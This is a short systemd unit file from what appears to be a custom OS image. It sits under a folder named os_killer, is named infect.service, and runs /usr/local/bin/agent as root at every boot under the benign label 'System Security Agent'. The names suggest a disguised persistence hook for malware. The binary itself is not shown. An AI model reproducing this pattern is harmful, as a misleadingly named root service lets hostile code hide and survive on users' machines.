# overlay/airootfs/etc/p3ng0s/os_killer/infect.service
[Unit]
Description=System Security Agent
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/agent
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
